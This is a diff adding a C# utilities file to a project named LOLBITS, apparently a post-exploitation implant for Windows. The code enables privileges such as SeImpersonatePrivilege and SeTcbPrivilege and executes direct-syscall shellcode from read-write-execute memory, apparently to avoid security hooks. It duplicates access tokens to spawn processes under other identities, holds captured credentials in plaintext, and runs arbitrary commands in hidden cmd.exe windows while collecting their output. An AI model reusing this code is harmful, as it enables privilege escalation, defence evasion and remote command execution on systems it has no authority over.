@@ -1,0 +1,646 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+using System.Threading;
+
+namespace LOLBITS
+{
+    public unsafe class Utils
+    {
+        public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
+        public const int SECURITY_MANDATORY_UNTRUSTED_RID = (0x00000000);
+        public const int SECURITY_MANDATORY_LOW_RID = (0x00001000);
+        public const int SECURITY_MANDATORY_MEDIUM_RID = (0x00002000);
+        public const int SECURITY_MANDATORY_HIGH_RID = (0x00003000);
+        public const int SECURITY_MANDATORY_SYSTEM_RID = (0x00004000);
+        public const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = (0x00005000);
+
+        [Flags]
+        public enum ProcessAccessFlags : uint
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID
+        {
+            public uint LowPart;
+            public int HighPart;
+        }
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID_AND_ATTRIBUTES
+        {
+            public LUID Luid;
+            public UInt32 Attributes;
+        }
+        const Int32 ANYSIZE_ARRAY = 1;
+
+        public struct TOKEN_PRIVILEGES
+        {
+            public UInt32 PrivilegeCount;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
+            public LUID_AND_ATTRIBUTES[] Privileges;
+        }
+
+
+        public enum LogonFlags
+        {
+            WithProfile = 1,
+            NetCredentialsOnly
+        };
+
+
+        [Flags()]
+        public enum TokenAccessFlags : int
+        {
+            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
+            STANDARD_RIGHTS_READ = 0x00020000,
+            TOKEN_ASSIGN_PRIMARY = 0x0001,
+            TOKEN_DUPLICATE = 0x0002,
+            TOKEN_IMPERSONATE = 0x0004,
+            TOKEN_QUERY = 0x0008,
+            TOKEN_QUERY_SOURCE = 0x0010,
+            TOKEN_ADJUST_PRIVILEGES = 0x0020,
+            TOKEN_ADJUST_GROUPS = 0x0040,
+            TOKEN_ADJUST_DEFAULT = 0x0080,
+            TOKEN_ADJUST_SESSIONID = 0x0100,
+            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
+            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
+                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
+                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
+                TOKEN_ADJUST_SESSIONID)
+        }
+
+
+        public enum SECURITY_IMPERSONATION_LEVEL
+        {
+            SecurityAnonymous,
+            SecurityIdentification,
+            SecurityImpersonation,
+            SecurityDelegation
+        }
+
+        public enum TOKEN_TYPE
+        {
+            TokenPrimary = 1,
+            TokenImpersonation
+        }
+
+        [Flags]
+        public enum CreationFlags
+        {
+            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+            CREATE_NEW_CONSOLE = 0x00000010,
+            CREATE_NEW_PROCESS_GROUP = 0x00000200,
+            CREATE_NO_WINDOW = 0x08000000,
+            CREATE_PROTECTED_PROCESS = 0x00040000,
+            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+            CREATE_SEPARATE_WOW_VDM = 0x00001000,
+            CREATE_SUSPENDED = 0x00000004,
+            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+            DEBUG_PROCESS = 0x00000001,
+            DETACHED_PROCESS = 0x00000008,
+            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        enum TOKEN_INFORMATION_CLASS
+        {
+            /// The buffer receives a TOKEN_USER structure that contains the user account of the token.
+            TokenUser = 1,
+            /// The buffer receives a TOKEN_GROUPS structure that contains the group accounts associated with the token.
+            TokenGroups,
+            /// The buffer receives a TOKEN_PRIVILEGES structure that contains the privileges of the token.
+            TokenPrivileges,
+            /// The buffer receives a TOKEN_OWNER structure that contains the default owner security identifier (SID) for newly created objects.
+            TokenOwner,
+            /// The buffer receives a TOKEN_PRIMARY_GROUP structure that contains the default primary group SID for newly created objects.
+            TokenPrimaryGroup,
+            /// The buffer receives a TOKEN_DEFAULT_DACL structure that contains the default DACL for newly created objects.
+            TokenDefaultDacl,
+            /// The buffer receives a TOKEN_SOURCE structure that contains the source of the token. TOKEN_QUERY_SOURCE access is needed to retrieve this information.
+            TokenSource,
+            /// The buffer receives a TOKEN_TYPE value that indicates whether the token is a primary or impersonation token.
+            TokenType,
+            /// The buffer receives a SECURITY_IMPERSONATION_LEVEL value that indicates the impersonation level of the token. If the access token is not an impersonation token, the function fails.
+            TokenImpersonationLevel,
+            /// The buffer receives a TOKEN_STATISTICS structure that contains various token statistics.
+            TokenStatistics,
+            /// The buffer receives a TOKEN_GROUPS structure that contains the list of restricting SIDs in a restricted token.
+            TokenRestrictedSids,
+            /// The buffer receives a DWORD value that indicates the Terminal Services session identifier that is associated with the token.
+            TokenSessionId,
+            /// The buffer receives a TOKEN_GROUPS_AND_PRIVILEGES structure that contains the user SID, the group accounts, the restricted SIDs, and the authentication ID associated with the token.
+            TokenGroupsAndPrivileges,
+            /// Reserved.
+            TokenSessionReference,
+            /// The buffer receives a DWORD value that is nonzero if the token includes the SANDBOX_INERT flag.
+            TokenSandBoxInert,
+            /// Reserved.
+            TokenAuditPolicy,
+            /// The buffer receives a TOKEN_ORIGIN value.
+            TokenOrigin,
+            /// The buffer receives a TOKEN_ELEVATION_TYPE value that specifies the elevation level of the token.
+            TokenElevationType,
+            /// The buffer receives a TOKEN_LINKED_TOKEN structure that contains a handle to another token that is linked to this token.
+            TokenLinkedToken,
+            /// The buffer receives a TOKEN_ELEVATION structure that specifies whether the token is elevated.
+            TokenElevation,
+            /// The buffer receives a DWORD value that is nonzero if the token has ever been filtered.
+            TokenHasRestrictions,
+            /// The buffer receives a TOKEN_ACCESS_INFORMATION structure that specifies security information contained in the token.
+            TokenAccessInformation,
+            /// The buffer receives a DWORD value that is nonzero if virtualization is allowed for the token.
+            TokenVirtualizationAllowed,
+            /// The buffer receives a DWORD value that is nonzero if virtualization is enabled for the token.
+            TokenVirtualizationEnabled,
+            /// The buffer receives a TOKEN_MANDATORY_LABEL structure that specifies the token's integrity level.
+            TokenIntegrityLevel,
+            /// The buffer receives a DWORD value that is nonzero if the token has the UIAccess flag set.
+            TokenUIAccess,
+            /// The buffer receives a TOKEN_MANDATORY_POLICY structure that specifies the token's mandatory integrity policy.
+            TokenMandatoryPolicy,
+            /// The buffer receives the token's logon security identifier (SID).
+            TokenLogonSid,
+            /// The maximum value for this enumeration
+            MaxTokenInfoClass
+        }
+
+        public enum SYSTEM_INFORMATION_CLASS
+        {
+            SystemBasicInformation = 0x0000,
+            SystemProcessorInformation = 0x0001,
+            SystemPerformanceInformation = 0x0002,
+            SystemPathInformation = 0x0004,
+            SystemProcessInformation = 0x0005,                   
+            SystemExtendedProcessInformation = 0x0039,
+            SystemFullProcessInformation = 0x0094,
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, Int32 Zero, IntPtr Null1, IntPtr Null2);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, TokenAccessFlags DesiredAccess, out IntPtr TokenHandle);
+
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool DuplicateTokenEx(
+            IntPtr hExistingToken,
+            TokenAccessFlags dwDesiredAccess,
+            IntPtr lpThreadAttributes,
+            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
+            TOKEN_TYPE TokenType,
+            out IntPtr phNewToken);
+
+        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto,
+            CallingConvention = CallingConvention.StdCall)]
+        public extern static bool CloseHandle(IntPtr handle);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public bool bInheritHandle;
+        }
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern bool CreateProcessAsUserW(
+            IntPtr hToken,
+            string lpApplicationName,
+            string lpCommandLine,
+            IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes,
+            bool bInheritHandles,
+            CreationFlags dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            ref STARTUPINFO lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(
+            IntPtr hToken,
+            LogonFlags dwLogonFlags,
+            string lpApplicationName,
+            string lpCommandLine,
+            CreationFlags dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            [In] ref STARTUPINFO lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, Int32 nSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithLogonW(
+             string userName,
+             string domain,
+             string password,
+             LogonFlags logonFlags,
+             string applicationName,
+             string commandLine,
+             CreationFlags creationFlags,
+             UInt32 environment,
+             string currentDirectory,
+             ref STARTUPINFO startupInfo,
+             out PROCESS_INFORMATION processInformation);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
+
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        internal static extern IntPtr VirtualAlloc(IntPtr baseAddress, UIntPtr size, MemoryAllocationFlags allocationType, MemoryProtectionFlags protection);
+
+        [Flags]
+        internal enum MemoryAllocationFlags
+        {
+            Commit = 0x01000,
+            Reserve = 0x02000
+        }
+
+        [Flags]
+        internal enum MemoryProtectionFlags
+        {
+            ExecuteReadWrite = 0x040,
+        }
+        [DllImport("ntdll.dll")]
+        public static extern int NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS InfoClass, IntPtr Info, uint Size, out uint Length);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtOpenProcessToken(IntPtr ProcessHandle, TokenAccessFlags DesiredAccess, out IntPtr TokenHandle);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, out IntPtr Buffer, uint NumberOfBytesToRead, out IntPtr NumberOfBytesReaded);
+
+        public static bool enablePrivileges(IntPtr handle, List<string> aPrivs)
+        {
+            LUID myLUID;
+
+            foreach (string aPriv in aPrivs)
+            {
+
+                try
+                {
+
+                    if (LookupPrivilegeValue(null, aPriv, out myLUID))
+                    {
+                        TOKEN_PRIVILEGES myTokenPrivileges;
+
+                        myTokenPrivileges.PrivilegeCount = 1;
+                        myTokenPrivileges.Privileges = new LUID_AND_ATTRIBUTES[1];
+                        myTokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                        myTokenPrivileges.Privileges[0].Luid = myLUID;
+
+                        AdjustTokenPrivileges(handle, false, ref myTokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
+                    }
+
+                }
+                catch { return false; }
+
+            }
+            return true;
+
+        }
+
+        public static void getProcessHandle(int pid, out IntPtr handle, ProcessAccessFlags flags)
+        {
+            handle = OpenProcess(flags, false, pid);
+        }
+
+        public static void getProcessToken(IntPtr handle, TokenAccessFlags access, out IntPtr currentToken, SyscallManager syscall)
+        {
+
+            IntPtr baseAddr = IntPtr.Zero;
+            byte[] shellcode = syscall.getSyscallASM("NtOpenProcessToken");
+            var shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
+            Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
+            var syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtOpenProcessToken));
+            IntPtr token = IntPtr.Zero;
+            var arguments = new object[] { handle, access, token };
+            var returnValue = syscallDelegate.DynamicInvoke(arguments);
+
+            currentToken = (IntPtr)arguments[2];
+        }
+
+        public static void duplicateToken(IntPtr token, TokenAccessFlags tokenAccess, SECURITY_IMPERSONATION_LEVEL se, TOKEN_TYPE type, out IntPtr duplicated)
+        {
+            if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, se, type, out duplicated))
+            {
+                duplicated = IntPtr.Zero;
+            }
+        }
+
+        public static void determineImpersonationMethod(IntPtr token, LogonFlags l, STARTUPINFO startupInfo, out PROCESS_INFORMATION processInfo)
+
+        {
+            if (CreateProcessAsUserW(token, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+                TokenManager.Method = 1;
+            else
+            {
+                if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+                    TokenManager.Method = 2;
+
+            }
+        }
+
+
+        // Code from https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
+        public static bool IsHighIntegrity(SyscallManager syscall)
+        {
+            IntPtr pId = (Process.GetCurrentProcess().Handle);
+
+            IntPtr hToken = IntPtr.Zero;
+
+            IntPtr baseAddr = IntPtr.Zero;
+            byte[] shellcode = syscall.getSyscallASM("NtOpenProcessToken");
+            var shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
+            Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
+            var syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtOpenProcessToken));
+            IntPtr token = IntPtr.Zero;
+            var arguments = new object[] { pId, TokenAccessFlags.TOKEN_QUERY, token };
+            var returnValue = syscallDelegate.DynamicInvoke(arguments);
+
+            if ((int)returnValue == 0)
+            {
+                try
+                {
+                    hToken = (IntPtr)arguments[2];
+                    IntPtr pb = Marshal.AllocCoTaskMem(1000);
+                    try
+                    {
+                        uint cb = 1000;
+                        if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb))
+                        {
+                            IntPtr pSid = Marshal.ReadIntPtr(pb);
+
+                            int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));
+
+                            return dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID ? true : false;
+
+
+                        }
+
+                    }
+                    finally
+                    {
+                        Marshal.FreeCoTaskMem(pb);
+                    }
+                }
+                finally
+                {
+                    CloseHandle(hToken);
+                }
+            }
+
+            return false;
+
+        }
+
+        public void Start()
+        {
+
+            SyscallManager syscall = new SyscallManager();
+
+
+            try
+            {
+                IntPtr token = WindowsIdentity.GetCurrent().Token;
+                List<string> aPrivs = new List<string>();
+
+                aPrivs.Add("SeImpersonatePrivilege");
+                aPrivs.Add("SeTcbPrivilege");
+                aPrivs.Add("SeAssignPrimaryTokenPrivilege");
+                aPrivs.Add("SeIncreaseQuotaPrivilege");
+
+                IntPtr currentToken;
+
+                IntPtr baseAddr = IntPtr.Zero;
+                byte[] shellcode = syscall.getSyscallASM("NtOpenProcessToken");
+                var shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
+                Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
+                var syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtOpenProcessToken));
+                IntPtr t = IntPtr.Zero;
+                var arguments = new object[] { Process.GetCurrentProcess().Handle, TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, t };
+                var returnValue = syscallDelegate.DynamicInvoke(arguments);
+
+                currentToken = (IntPtr)arguments[2];
+                enablePrivileges(currentToken, aPrivs);
+
+                CloseHandle(currentToken);
+
+                TokenAccessFlags tokenAccess = TokenAccessFlags.TOKEN_QUERY | TokenAccessFlags.TOKEN_ASSIGN_PRIMARY |
+                TokenAccessFlags.TOKEN_DUPLICATE | TokenAccessFlags.TOKEN_ADJUST_DEFAULT |
+                TokenAccessFlags.TOKEN_ADJUST_SESSIONID;
+
+                IntPtr newToken = IntPtr.Zero;
+                if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out newToken))
+                {
+                    return;
+
+                }
+
+                STARTUPINFO startupInfo = new STARTUPINFO();
+                startupInfo.cb = Marshal.SizeOf(startupInfo);
+                startupInfo.lpDesktop = "";
+                startupInfo.wShowWindow = 0;
+                startupInfo.dwFlags |= 0x00000001;
+
+                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+                LogonFlags l = new LogonFlags();
+
+                if (CreateProcessAsUserW(newToken, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+                {
+                    TokenManager.Token = newToken;
+                    TokenManager.Method = 1;
+
+                }
+                else
+                {
+                    if (CreateProcessWithTokenW(newToken, l, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+                    {
+                        TokenManager.Token = newToken;
+                        TokenManager.Method = 2;
+
+                    }
+                }
+
+            }
+            catch { }
+
+
+        }
+
+        public static string ExecuteCommand(string command)
+        {
+            string output = "";
+            if (TokenManager.Token == IntPtr.Zero && TokenManager.Method == 0)
+            {
+                Process process = new Process();
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                startInfo.FileName = @"C:\windows\system32\cmd.exe";
+                startInfo.Arguments = "/C" + command + " && exit";
+                startInfo.RedirectStandardOutput = true;
+                startInfo.RedirectStandardError = true;
+                startInfo.UseShellExecute = false;
+                process.StartInfo = startInfo;
+                process.Start();
+                output = process.StandardOutput.ReadToEnd();
+                if (output == "")
+                    output = string.Concat("ERR:", process.StandardError.ReadToEnd());
+                process.WaitForExit();
+                process.Close();
+            }
+            else
+            {
+
+                IntPtr out_read = IntPtr.Zero;
+                IntPtr out_write = IntPtr.Zero;
+
+                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
+                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
+                saAttr.bInheritHandle = true;
+                saAttr.lpSecurityDescriptor = IntPtr.Zero;
+
+                CreatePipe(ref out_read, ref out_write, ref saAttr, 0);
+
+                STARTUPINFO startupInfo = new STARTUPINFO();
+                startupInfo.cb = Marshal.SizeOf(startupInfo);
+                startupInfo.lpDesktop = "";
+                startupInfo.hStdOutput = out_write;
+                startupInfo.hStdError = out_write;
+                startupInfo.wShowWindow = 0;
+                startupInfo.dwFlags |= 0x00000101;
+
+                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+                LogonFlags l = new LogonFlags();
+
+                if (TokenManager.Method == 1)
+
+                    CreateProcessAsUserW(TokenManager.Token, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);
+
+                else if (TokenManager.Method == 2)
+
+                    CreateProcessWithTokenW(TokenManager.Token, l, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);
+
+                else
+
+                    CreateProcessWithLogonW(TokenManager.creds[0], TokenManager.creds[1], TokenManager.creds[2], l, null, @"c:\windows\system32\cmd.exe /Q /C" + command, 0, 0, null, ref startupInfo, out processInfo);
+
+
+                byte[] buf = new byte[100];
+                int dwRead = 0;
+                Thread.Sleep(500);
+
+                while (true)
+                {
+                    bool bSuccess = ReadFile(out_read, buf, 100, ref dwRead, IntPtr.Zero);
+                    output = string.Concat(output, Encoding.Default.GetString(buf));
+
+                    if (!bSuccess || dwRead < 100)
+                        break;
+
+
+                }
+
+                CloseHandle(out_read);
+                CloseHandle(out_write);
+            }
+
+            return output;
+        }
+
+        internal static void Runas(string domain, string user, string password)
+        {
+            STARTUPINFO startupInfo = new STARTUPINFO();
+            startupInfo.cb = Marshal.SizeOf(startupInfo);
+            startupInfo.lpDesktop = "";
+            startupInfo.wShowWindow = 0;
+            startupInfo.dwFlags |= 0x00000001;
+
+            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
+            LogonFlags l = new LogonFlags();
+
+            if (CreateProcessWithLogonW(user, domain, password, l, null, @"c:\windows\system32\cmd.exe /Q /C hostname", 0, 0, null, ref startupInfo, out processInfo))
+            {
+                TokenManager.Method = 3;
+                TokenManager.creds[0] = user;
+                TokenManager.creds[1] = domain;
+                TokenManager.creds[2] = password;
+            }
+
+        }
+    }
+}
